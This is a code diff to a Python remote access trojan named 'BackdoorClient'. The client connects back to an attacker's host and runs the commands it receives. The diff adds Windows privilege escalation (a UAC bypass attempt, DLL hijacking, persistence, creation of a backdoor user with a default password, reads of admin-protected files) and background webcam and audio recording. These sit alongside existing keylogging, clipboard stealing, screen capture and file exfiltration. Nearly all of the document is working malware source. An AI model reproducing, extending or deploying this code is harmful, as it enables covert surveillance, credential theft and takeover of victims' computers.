@@ -32,21 +32,39 @@ class BackdoorClient:
     """Backdoor client with advanced features"""
     
     def __init__(self, host='192.168.0.100', port=5555):
+        """
+        Initialize the backdoor client (target-side)
+        
+        Args:
+            host: IP address of attacker's server to connect to
+            port: Port number of attacker's server
+        """
+        # Attacker's server address
         self.host = host
         self.port = port
+        # Socket for connecting to attacker
         self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         
-        # Initialize feature modules
+        # Initialize feature modules if available
         if FEATURES_AVAILABLE:
+            # Keylogger for capturing keystrokes (uses pynput or fallback)
             self.keylogger = Keylogger() if PYNPUT_AVAILABLE else FallbackKeylogger()
+            # Privilege escalation tools (Windows-focused)
             self.priv_esc = PrivilegeEscalation()
+            # Screen capture for screenshots
             self.screen_capture = ScreenCapture()
+            # Audio recording capabilities
             self.audio_capture = AudioCapture()
+            # Webcam capture for images/video
             self.webcam_capture = WebcamCapture()
+            # Screen video recording
             self.screen_recorder = ScreenRecorder()
+            # Network discovery and scanning
             self.network_discovery = NetworkDiscovery()
+            # Clipboard monitoring and stealing
             self.clipboard_stealer = ClipboardStealer() if PYPERCLIP_AVAILABLE else FallbackClipboardStealer()
         else:
+            # Set all features to None if modules not available
             self.keylogger = None
             self.priv_esc = None
             self.screen_capture = None
@@ -57,7 +75,14 @@ class BackdoorClient:
             self.clipboard_stealer = None
     
     def reliable_send(self, data):
-        """Send data in a reliable way (encoded as JSON)"""
+        """
+        Send data reliably to the attacker machine
+        
+        Converts data to JSON format and encodes to bytes before sending.
+        
+        Args:
+            data: Any JSON-serializable data to send to attacker
+        """
         try:
             jsondata = json.dumps(data)
             self.socket.send(jsondata.encode())
@@ -65,7 +90,15 @@ class BackdoorClient:
             print(f"[!] Error sending data: {e}")
     
     def reliable_recv(self):
-        """Receive data in a reliable way (expects JSON data)"""
+        """
+        Receive data reliably from the attacker machine
+        
+        Receives data in chunks and attempts to parse as JSON.
+        Continues receiving until valid JSON is obtained.
+        
+        Returns:
+            Parsed JSON data from attacker, or None if error occurs
+        """
         data = ''
         while True:
             try:
@@ -78,7 +111,15 @@ class BackdoorClient:
                 return None
     
     def upload_file(self, file_name):
-        """Upload a file to the attacker"""
+        """
+        Upload a file from target machine to attacker
+        
+        Reads the specified file and sends its binary content to attacker.
+        This is called when attacker uses 'download' command.
+        
+        Args:
+            file_name: Path to the file on target machine to upload
+        """
         try:
             with open(file_name, 'rb') as f:
                 self.socket.send(f.read())
@@ -86,7 +127,15 @@ class BackdoorClient:
             self.reliable_send(f"Error uploading file: {str(e)}")
     
     def download_file(self, file_name):
-        """Download a file from the attacker"""
+        """
+        Download a file from attacker to target machine
+        
+        Receives file content in chunks and saves to target machine.
+        This is called when attacker uses 'upload' command.
+        
+        Args:
+            file_name: Path where file should be saved on target machine
+        """
         try:
             with open(file_name, 'wb') as f:
                 self.socket.settimeout(1)
@@ -102,7 +151,19 @@ class BackdoorClient:
             self.reliable_send(f"Error downloading file: {str(e)}")
     
     def handle_command(self, command):
-        """Handle received commands with enhanced features"""
+        """
+        Handle received commands from attacker with enhanced features
+        
+        This is the main command dispatcher that routes commands to appropriate
+        feature modules. Supports basic file operations, keylogging, privilege
+        escalation, media capture, network discovery, and clipboard stealing.
+        
+        Args:
+            command: Command string received from attacker
+            
+        Returns:
+            'quit' to close connection, 'continue' to keep connection alive
+        """
         try:
             # Basic commands
             if command == 'quit':
@@ -208,6 +269,8 @@ class BackdoorClient:
                 return 'continue'
             
             # Privilege escalation commands
+            
+            # Check current privileges
             elif command == 'priv_check':
                 if self.priv_esc:
                     status = self.priv_esc.get_status()
@@ -216,17 +279,29 @@ class BackdoorClient:
                     self.reliable_send("Privilege escalation feature not available")
                 return 'continue'
             
+            # Comprehensive privilege enumeration
             elif command == 'priv_enum':
                 if self.priv_esc:
-                    result = f"""
-                    === Privilege Enumeration === {self.priv_esc.check_suid_binaries()}
-                    === Sudo Opportunities === {self.priv_esc.find_sudo_opportunities()}
-                    === Kernel Version === {self.priv_esc.check_kernel_version()}"""
-                    self.reliable_send(result)
+                    if self.priv_esc.system != 'Windows':
+                        self.reliable_send("Privilege escalation module only supports Windows")
+                    else:
+                        result = f"""
+=== Windows Privilege Enumeration ===
+
+UAC Status:
+{json.dumps(self.priv_esc.check_uac_status(), indent=2)}
+
+Service Permissions:
+{self.priv_esc.check_service_permissions()}
+
+System Information:
+{self.priv_esc.get_system_info()[:500]}"""
+                        self.reliable_send(result)
                 else:
                     self.reliable_send("Privilege escalation feature not available")
                 return 'continue'
             
+            # List running services
             elif command == 'priv_services':
                 if self.priv_esc:
                     result = self.priv_esc.enumerate_services()
@@ -235,6 +310,7 @@ class BackdoorClient:
                     self.reliable_send("Privilege escalation feature not available")
                 return 'continue'
             
+            # Check scheduled tasks
             elif command == 'priv_tasks':
                 if self.priv_esc:
                     result = self.priv_esc.check_scheduled_tasks()
@@ -243,10 +319,162 @@ class BackdoorClient:
                     self.reliable_send("Privilege escalation feature not available")
                 return 'continue'
             
+            # Find sensitive files
             elif command == 'priv_sensitive':
                 if self.priv_esc:
                     result = self.priv_esc.find_sensitive_files()
                     self.reliable_send(result)
+                else:
+                    self.reliable_send("Privilege escalation feature not available")
+                return 'continue'
+            
+            # Find weak file permissions
+            elif command == 'priv_weak_perms':
+                if self.priv_esc:
+                    result = self.priv_esc.exploit_weak_file_permissions()
+                    if isinstance(result, list):
+                        self.reliable_send("Exploitable Files:\n" + "\n".join(result))
+                    else:
+                        self.reliable_send(str(result))
+                else:
+                    self.reliable_send("Privilege escalation feature not available")
+                return 'continue'
+            
+            # Comprehensive escalation scan
+            elif command == 'priv_scan':
+                if self.priv_esc:
+                    result = self.priv_esc.comprehensive_escalation_scan()
+                    self.reliable_send(json.dumps(result, indent=2))
+                else:
+                    self.reliable_send("Privilege escalation feature not available")
+                return 'continue'
+            
+            # Windows UAC bypass attempt
+            elif command == 'priv_uac_bypass':
+                if self.priv_esc:
+                    result = self.priv_esc.attempt_uac_bypass()
+                    self.reliable_send(result)
+                else:
+                    self.reliable_send("Privilege escalation feature not available")
+                return 'continue'
+            
+            # DLL hijacking opportunities (Windows)
+            elif command == 'priv_dll_hijack':
+                if self.priv_esc:
+                    result = self.priv_esc.attempt_dll_hijacking()
+                    if isinstance(result, list):
+                        self.reliable_send("DLL Hijacking Opportunities:\n" + "\n".join(result[:30]))
+                    else:
+                        self.reliable_send(str(result))
+                else:
+                    self.reliable_send("Privilege escalation feature not available")
+                return 'continue'
+            
+            # Create persistence mechanism
+            elif command.startswith('priv_persist'):
+                if self.priv_esc:
+                    parts = command.split()
+                    payload_path = parts[1] if len(parts) > 1 else None
+                    result = self.priv_esc.create_persistence_mechanism(payload_path)
+                    self.reliable_send(result)
+                else:
+                    self.reliable_send("Privilege escalation feature not available")
+                return 'continue'
+            
+            # Create backdoor user (requires admin)
+            elif command.startswith('priv_user'):
+                if self.priv_esc:
+                    parts = command.split()
+                    username = parts[1] if len(parts) > 1 else "support"
+                    password = parts[2] if len(parts) > 2 else "P@ssw0rd123"
+                    result = self.priv_esc.create_backdoor_user(username, password)
+                    self.reliable_send(result)
+                else:
+                    self.reliable_send("Privilege escalation feature not available")
+                return 'continue'
+            
+            # Read admin-protected file
+            elif command.startswith('priv_read_file '):
+                if self.priv_esc:
+                    file_path = command[15:].strip()  # Remove 'priv_read_file '
+                    if file_path:
+                        result = self.priv_esc.read_admin_file(file_path)
+                        if result['success']:
+                            response = f"[+] File read successfully using {result['method']}\n"
+                            response += f"[+] File: {file_path}\n"
+                            response += f"[+] Content length: {len(result['content'])} characters\n"
+                            response += "=" * 60 + "\n"
+                            response += result['content']
+                            response += "\n" + "=" * 60
+                            self.reliable_send(response)
+                        else:
+                            self.reliable_send(f"[-] Failed to read file: {result['error']}")
+                    else:
+                        self.reliable_send("Usage: priv_read_file <file_path>")
+                else:
+                    self.reliable_send("Privilege escalation feature not available")
+                return 'continue'
+            
+            # Read admin-protected binary file
+            elif command.startswith('priv_read_binary '):
+                if self.priv_esc:
+                    file_path = command[17:].strip()  # Remove 'priv_read_binary '
+                    if file_path:
+                        result = self.priv_esc.read_admin_file_binary(file_path)
+                        if result['success']:
+                            response = f"[+] Binary file read successfully using {result['method']}\n"
+                            response += f"[+] File: {file_path}\n"
+                            response += f"[+] File size: {result['file_size']} bytes\n"
+                            response += f"[+] Base64 length: {len(result['content_base64'])} characters\n"
+                            response += "=" * 60 + "\n"
+                            response += "Base64 Content (first 500 chars):\n"
+                            response += result['content_base64'][:500]
+                            if len(result['content_base64']) > 500:
+                                response += f"\n... ({len(result['content_base64']) - 500} more characters)"
+                            response += "\n" + "=" * 60
+                            self.reliable_send(response)
+                        else:
+                            self.reliable_send(f"[-] Failed to read binary file: {result['error']}")
+                    else:
+                        self.reliable_send("Usage: priv_read_binary <file_path>")
+                else:
+                    self.reliable_send("Privilege escalation feature not available")
+                return 'continue'
+            
+            # List admin-protected directory
+            elif command.startswith('priv_list_dir '):
+                if self.priv_esc:
+                    dir_path = command[14:].strip()  # Remove 'priv_list_dir '
+                    if dir_path:
+                        result = self.priv_esc.list_admin_directory(dir_path)
+                        if result['success']:
+                            response = f"[+] Directory listed successfully using {result['method']}\n"
+                            response += f"[+] Directory: {dir_path}\n"
+                            response += f"[+] Directories: {len(result['directories'])}, Files: {len(result['files'])}\n"
+                            response += "=" * 60 + "\n"
+                            
+                            if result['directories']:
+                                response += "DIRECTORIES:\n"
+                                for d in result['directories'][:50]:  # Limit to 50
+                                    response += f"  [DIR]  {d['name']}\n"
+                                if len(result['directories']) > 50:
+                                    response += f"  ... and {len(result['directories']) - 50} more directories\n"
+                                response += "\n"
+                            
+                            if result['files']:
+                                response += "FILES:\n"
+                                for f in result['files'][:50]:  # Limit to 50
+                                    size_str = f"{f['size']} bytes" if isinstance(f['size'], int) else f['size']
+                                    response += f"  [FILE] {f['name']} ({size_str})\n"
+                                if len(result['files']) > 50:
+                                    response += f"  ... and {len(result['files']) - 50} more files\n"
+                            
+                            response += "=" * 60
+                            self.reliable_send(response)
+                        else:
+                            self.reliable_send(f"[-] Failed to list directory: {result['error']}")
+                    else:
+                        self.reliable_send("Usage: priv_list_dir <directory_path>")
                 else:
                     self.reliable_send("Privilege escalation feature not available")
                 return 'continue'
@@ -287,12 +515,10 @@ class BackdoorClient:
 
             # Audio capture commands
 
-            # record audio
-            elif command.startswith('audio_record'):
+            # start audio recording (background)
+            elif command == 'audio_start':
                 if self.audio_capture:
-                    parts = command.split()
-                    duration = int(parts[1]) if len(parts) > 1 else 10
-                    result = self.audio_capture.record_audio(duration)
+                    result = self.audio_capture.start_audio()
                     self.reliable_send(result)
                 else:
                     self.reliable_send("Audio capture feature not available")
@@ -302,6 +528,26 @@ class BackdoorClient:
             elif command == 'audio_stop':
                 if self.audio_capture:
                     result = self.audio_capture.stop_audio()
+                    self.reliable_send(result)
+                else:
+                    self.reliable_send("Audio capture feature not available")
+                return 'continue'
+            
+            # check audio recording status
+            elif command == 'audio_status':
+                if self.audio_capture:
+                    result = self.audio_capture.get_audio_status()
+                    self.reliable_send(result)
+                else:
+                    self.reliable_send("Audio capture feature not available")
+                return 'continue'
+            
+            # record audio (legacy - fixed duration)
+            elif command.startswith('audio_record'):
+                if self.audio_capture:
+                    parts = command.split()
+                    duration = int(parts[1]) if len(parts) > 1 else 10
+                    result = self.audio_capture.record_audio(duration)
                     self.reliable_send(result)
                 else:
                     self.reliable_send("Audio capture feature not available")
@@ -372,7 +618,34 @@ class BackdoorClient:
 
             # Webcam capture commands
 
-            # capture webcam image  
+            # start webcam video recording (background)
+            elif command == 'webcam_start':
+                if self.webcam_capture:
+                    result = self.webcam_capture.start_webcam_recording()
+                    self.reliable_send(result)
+                else:
+                    self.reliable_send("Webcam capture feature not available")
+                return 'continue'
+            
+            # stop webcam recording
+            elif command == 'webcam_stop':
+                if self.webcam_capture:
+                    result = self.webcam_capture.stop_webcam()
+                    self.reliable_send(result)
+                else:
+                    self.reliable_send("Webcam capture feature not available")
+                return 'continue'
+            
+            # check webcam recording status
+            elif command == 'webcam_status':
+                if self.webcam_capture:
+                    result = self.webcam_capture.get_webcam_status()
+                    self.reliable_send(result)
+                else:
+                    self.reliable_send("Webcam capture feature not available")
+                return 'continue'
+            
+            # capture webcam image (legacy - single snapshot)
             elif command == 'webcam_snap':
                 if self.webcam_capture:
                     result = self.webcam_capture.capture_image()
@@ -381,7 +654,7 @@ class BackdoorClient:
                     self.reliable_send("Webcam capture feature not available")
                 return 'continue'
             
-            # list webcam images
+            # list webcam images and videos
             elif command == 'webcam_list':
                 if self.webcam_capture:
                     result = self.webcam_capture.list_images()
@@ -561,7 +834,12 @@ class BackdoorClient:
 
     # Send advanced help information
     def send_advanced_help(self):
-        """Send help information about all features"""
+        """
+        Send help information about all features to the attacker
+        
+        Provides comprehensive command reference for all available backdoor
+        features including keylogger, privilege escalation, media capture, etc.
+        """
         help_text = """
         === Enhanced Backdoor Commands ===
 
@@ -582,24 +860,43 @@ class BackdoorClient:
         keylog_manual <text> - Manually log text (fallback mode)
 
         PRIVILEGE ESCALATION:
-        priv_check          - Check current privileges
-        priv_enum           - Enumerate privilege escalation vectors
-        priv_services       - List running services
-        priv_tasks          - List scheduled tasks
-        priv_sensitive      - Find sensitive files
+        priv_check          - Check current privileges and user information
+        priv_enum           - Enumerate Windows privilege escalation vectors
+        priv_scan           - Comprehensive escalation scan (all vectors)
+        priv_services       - List running Windows services and permissions
+        priv_tasks          - List Windows scheduled tasks
+        priv_sensitive      - Find sensitive files (credentials, keys, configs)
+        priv_weak_perms     - Find exploitable file permissions
+        priv_uac_bypass     - Attempt UAC bypass (Windows only)
+        priv_dll_hijack     - Find DLL hijacking opportunities (Windows)
+        priv_persist [path] - Create persistence mechanism
+        priv_user [user] [pass] - Create backdoor user (requires admin)
+        priv_read_file <path> - Read admin-protected file (attempts elevation)
+        priv_read_binary <path> - Read admin-protected binary file (base64)
+        priv_list_dir <path> - List admin-protected directory contents
 
         SCREEN & MEDIA:
         screenshot          - Capture single screenshot
         screenshot_multi <count> <interval> - Capture multiple screenshots
         screenshot_list     - List captured screenshots
-        audio_record <sec>  - Record audio (default 10 seconds)
+        
+        audio_start         - Start background audio recording
+        audio_stop          - Stop audio recording and save
+        audio_status        - Check audio recording status
+        audio_record <sec>  - Record audio for specific duration (default 10s)
         audio_list          - List audio recordings
-        record_screen <sec> <fps> - Record screen (default 10s, 15fps)
-        record_start <max>  - Start background recording (max duration in seconds)
-        record_stop         - Stop background recording
-        record_status       - Check recording status
+        
+        record_start <max>  - Start background screen recording (max duration in seconds)
+        record_stop         - Stop screen recording and save
+        record_status       - Check screen recording status
+        record_screen <sec> <fps> - Record screen for specific duration (default 10s, 15fps)
         record_list         - List screen recordings
-        webcam_snap         - Capture webcam image
+        
+        webcam_start        - Start background webcam recording
+        webcam_stop         - Stop webcam recording and save
+        webcam_status       - Check webcam recording status
+        webcam_snap         - Capture single webcam image
+        webcam_list         - List webcam images and videos
 
         NETWORK DISCOVERY:
         net_info            - Display network information
@@ -625,7 +922,15 @@ class BackdoorClient:
     
     # get system information
     def get_system_info(self):
-        """Gather comprehensive system information"""
+        """
+        Gather comprehensive system information from target machine
+        
+        Collects hostname, OS details, Python version, current directory,
+        user information, network IP, and privilege status.
+        
+        Returns:
+            Formatted string containing system information
+        """
         import platform
         
         info = f"""
@@ -650,7 +955,12 @@ class BackdoorClient:
 
     # Main shell function for command execution
     def shell(self):
-        """Main shell function for command execution"""
+        """
+        Main shell function for command execution
+        
+        Continuously receives commands from attacker and executes them
+        using handle_command(). Runs until 'quit' command received.
+        """
         while True:
             command = self.reliable_recv()
             if command is None:
@@ -662,7 +972,13 @@ class BackdoorClient:
 
     # Establish connection to attacker machine (reverse shell)
     def connection(self):
-        """Establish connection to attacker machine (reverse shell)"""
+        """
+        Establish connection to attacker machine (reverse shell)
+        
+        Continuously attempts to connect back to the attacker's server.
+        Implements automatic reconnection with 20-second delay between attempts.
+        Once connected, enters the command execution shell.
+        """
         while True:
             time.sleep(20)  # Wait before reconnecting
             try:
@@ -687,8 +1003,8 @@ if __name__ == "__main__":
     print("=" * 70)
     
     # Configuration - Change these to match your attacker machine
-    ATTACKER_HOST = '192.168.0.107'  # Change to attacker's IP address
-    ATTACKER_PORT = 5556            # Must match port in server.py
+    ATTACKER_HOST = '192.168.0.100'  # Change to attacker's IP address
+    ATTACKER_PORT = 5557            # Must match port in server.py
     
     print(f"\n[*] Configured to connect to: {ATTACKER_HOST}:{ATTACKER_PORT}")
     print("[*] Starting connection attempts...")
